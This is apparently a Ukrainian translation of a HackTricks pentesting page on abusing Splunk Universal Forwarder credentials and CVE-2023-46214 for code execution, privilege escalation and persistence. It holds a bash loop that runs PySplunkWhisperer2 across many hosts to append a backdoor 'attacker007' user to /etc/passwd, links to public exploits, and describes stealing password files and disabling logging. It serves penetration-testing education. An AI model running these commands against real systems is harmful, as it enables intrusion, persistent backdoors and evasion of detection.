# Привилегії та постійність Splunk LPE

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакінг-трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв GitHub**.

</details>

Якщо ви **проводите** перелік машин **внутрішньо** або **зовнішньо** і знаходите **Splunk, який працює** (порт 8090), якщо вам пощастить знати **дійсні облікові дані**, ви можете **зловживати службою Splunk**, щоб **виконати оболонку** в якості користувача, який запускає Splunk. Якщо це запущено в якості root, ви можете підвищити привілеї до root.

Також, якщо ви **вже root, і служба Splunk не прослуховує лише localhost**, ви можете **вкрасти** файл **паролів** зі служби Splunk і **розшифрувати** паролі або **додати нові** облікові дані до нього. І зберігати постійність на хості.

На першому зображенні нижче ви можете побачити, як виглядає веб-сторінка Splunkd.



## Короткий огляд експлойту Splunk Universal Forwarder Agent

Для отримання додаткових відомостей перегляньте пост [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише короткий огляд:

**Огляд експлойту:**
Експлойт, спрямований на агента Splunk Universal Forwarder (UF), дозволяє атакуючим з паролем агента виконувати довільний код на системах, на яких працює агент, що потенційно може скомпрометувати всю мережу.

**Ключові моменти:**
- Агент UF не перевіряє вхідні з'єднання або автентичність коду, що робить його вразливим на виконання несанкціонованого коду.
- Загальні методи отримання паролів включають їх знаходження в мережевих каталогах, файлових ресурсах або внутрішніх документаціях.
- Успішна експлуатація може призвести до доступу на рівні SYSTEM або root на скомпрометованих хостах, виведення даних та подальшу інфільтрацію мережі.

**Виконання експлойту:**
1. Атакуючий отримує пароль агента UF.
2. Використовує API Splunk для відправки команд або сценаріїв агентам.
3. Можливі дії включають вилучення файлів, маніпулювання обліковими записами користувачів та компрометацію системи.

**Наслідки:**
- Повна компрометація мережі з рівнем доступу SYSTEM/root на кожному хості.
- Можливість вимкнення ведення журналу для ухилення від виявлення.
- Встановлення задніх дверей або вимагання викупу.

**Приклад команди для експлуатації:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Використовувані публічні експлойти:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Зловживання запитами Splunk

**Для отримання додаткових відомостей перегляньте пост [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** дозволяв завантажити довільний скрипт до **`$SPLUNK_HOME/bin/scripts`** і потім пояснював, що за допомогою запиту пошуку **`|runshellscript script_name.sh`** було можливо **виконати** **скрипт**, збережений там.


<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний мерч PEASS & HackTricks**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
